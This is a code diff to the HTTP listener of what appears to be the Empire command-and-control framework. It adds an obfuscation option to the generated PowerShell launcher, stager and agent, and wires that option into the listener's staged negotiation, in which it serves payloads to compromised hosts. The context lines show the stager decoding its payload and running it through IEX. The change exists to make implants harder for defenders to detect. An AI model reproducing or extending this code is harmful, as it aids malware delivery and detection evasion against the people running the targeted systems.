@@ -146,7 +146,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -252,9 +252,11 @@ class Listener:
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
-
+                
+                if obfuscate:
+                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -346,7 +348,7 @@ class Listener:
             print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         Generate the stager code needed for communications with this listener.
         """
@@ -399,7 +401,9 @@ class Listener:
                         randomizedStager += helpers.randomize_capitalization(line)
                     else:
                         randomizedStager += line
-
+            
+            if obfuscate:
+                randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -442,7 +446,7 @@ class Listener:
             print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_agent(self, listenerOptions, language=None):
+    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
         """
@@ -485,7 +489,8 @@ class Listener:
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if workingHours != "":
                 code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
+            if obfuscate:
+                code = helpers.obfuscate(code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
@@ -753,7 +758,7 @@ def send_message(packets=None):
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
+                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(stage, 200)
 
                             elif results.startswith('ERROR:'):
@@ -816,7 +821,7 @@ def send_message(packets=None):
                                 tempListenerOptions = listenerOptions
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions)
+                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
@@ -840,7 +845,8 @@ def send_message(packets=None):
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
 		certPath = os.path.abspath(certPath)
-                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=(certPath,certPath))
+		context = ("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
+                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
